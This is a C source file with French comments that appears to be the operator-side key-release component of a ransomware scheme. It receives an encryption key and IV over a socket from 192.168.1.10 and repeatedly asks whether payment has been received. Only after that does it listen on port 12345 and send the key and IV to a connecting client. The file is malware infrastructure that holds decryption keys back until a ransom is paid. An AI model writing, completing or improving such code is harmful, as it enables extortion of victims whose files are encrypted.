#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>

unsigned char key[128];
unsigned char iv[64];

int receive_key_iv(unsigned char *key, unsigned char *iv);
int send_key_iv(unsigned char *key, unsigned char *iv);

int main(int argc, char argv[]){

    receive_key_iv(key, iv);

    int choice = 0;
    while (choice != 1){
        
        printf("\nPaiement reçu ? Oui : 1 || Non : 2\n");
        printf("Réponse : ");
        scanf("%d", &choice);
    }
    printf("\nIl a payé !");
    send_key_iv(key,iv);
}


int receive_key_iv(unsigned char *key, unsigned char *iv)
{
    // On crée un socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket() failed");
        exit(1);
    }

    // On définit le protocole, l'adresse du serveur et un port
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.10");
    server_addr.sin_port = htons(12345);

    // On se connecte au serveur
    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        perror("connect() failed");
        exit(1);
    }

    // On reçoit la clé et l'IV
    
    if (recv(sockfd, key, 128, 0) < 0 || recv(sockfd, iv, 64, 0) < 0) {
        perror("recv() failed");
        exit(1);
    }
    printf("\nReceived key: ");
    for (int i = 0; i < 32; i++) {
        printf("%02x", key[i]);
    }
    printf("\nReceived IV: ");
    for (int i = 0; i < 16; i++) {
        printf("%02x", iv[i]);
    }
    printf("\n");

    //On ferme le socket
    //close(sockfd);

    return 0;
}

int send_key_iv(unsigned char *key, unsigned char *iv)
{
    // On crée un socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket() failed");
        exit(1);
    }

    // On définit le protocole, l'adresse du serveur et un port
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(12345);

    // On se connecte au serveur
    if (bind(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        perror("bind() failed");
        exit(1);
    }

    printf("\nSending ......................\n");

    // On écoute le serveur
    if (listen(sockfd, 5) < 0) {
        perror("listen() failed");
        exit(1);
    }

    // On accepte la connexion
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    int client_sockfd = accept(sockfd, (struct sockaddr*) &client_addr, &client_addr_len);
    if (client_sockfd < 0) {
        perror("accept() failed");
        exit(1);
    }

    // On envoie la clé et l'IV
    if (send(client_sockfd, key, 128, 0) < 0 || send(client_sockfd, iv, 64, 0) < 0) {
        perror("send() failed");
        exit(1);
    }

    //On ferme le socket
    //close(sockfd);

    return 0;
}